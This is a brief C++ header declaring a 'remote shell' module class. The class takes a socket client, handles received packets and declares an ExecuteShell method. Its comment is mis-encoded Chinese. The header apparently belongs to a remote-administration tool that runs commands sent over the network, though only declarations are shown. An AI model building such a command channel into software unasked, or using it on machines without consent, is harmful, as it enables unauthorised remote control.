#pragma once

#include "SocketClient.h"
//#include "ModuleManage.h"

class CSocketClient;


class CModuleShellRemote : public CModule {

public:
	CModuleShellRemote(CSocketClient* pSocketClient);
	~CModuleShellRemote();

	// ÖØÐ´Ðéº¯Êý
	void OnRecvivePacket(CPacket* pPacket);

	DWORD ExecuteShell(WCHAR* pszCommand);
};